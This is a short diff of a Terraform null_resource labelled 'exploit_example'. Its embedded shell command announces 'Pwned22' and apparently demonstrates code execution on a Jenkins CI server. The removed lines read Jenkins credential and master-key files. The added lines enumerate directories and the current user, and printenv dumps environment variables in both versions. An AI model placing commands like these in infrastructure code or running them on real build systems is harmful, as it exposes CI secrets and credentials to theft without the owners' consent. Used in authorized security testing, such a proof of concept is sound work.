@@ -3,9 +3,10 @@ resource "null_resource" "exploit_example" {
     command = <<EOT
     #!/bin/bash
     echo Pwned22
-    cat $JENKINS_HOME/credentials.xml 
-    cat $JENKINS_HOME/secrets/master.key
-    cat $JENKINS_HOME/secrets/hudson.util.Secret 
+    ls $JENKINS_HOME
+    ls -al /opt
+    ls -al /home/ci
+    whoami
     printenv
     date
     EOT
